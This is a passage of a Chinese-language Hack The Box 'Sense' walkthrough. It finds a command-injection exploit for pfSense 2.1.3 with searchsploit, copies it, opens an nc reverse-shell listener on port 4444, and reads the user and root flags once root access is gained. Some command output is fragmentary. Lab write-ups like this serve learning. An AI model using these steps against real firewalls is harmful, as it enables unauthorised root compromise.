# 漏洞利用

现在去登录

![](../Images/55a7c9f9535d1ff46f18275b24d59637.png)

登入后可以看到，当前版本是 pfsense 2.1.3

去查找一下是否有漏洞

```

┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]# searchsploit pfsense 2.1.3

'status_rrd_graph_img.php'

 Command Injection                                                                                                                    | php/webapps/43560.py
```

还真找到一个

```

┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense]# locate php/webapps/43560.py

# cp /usr/share/exploitdb/exploits/php/webapps/43560.py ./exploit.py

```

把 exploit 给复制过来

使用 nc 监听一个端口

```

┌──(root💀kali)-[~/Desktop]# nc -nvlp 4444                                      


```

然后去执行 exploit

```

┌──(root💀kali)-[~/Desktop]# nc -nvlp 4444                                      

't access tty; job control turned off
```

成功拿到 root 权限的 shell

```
# cat /home/rohit/user.txt

# cat /root/root.txt


```

拿到 user 权限 和 root 权限的 flag 文件
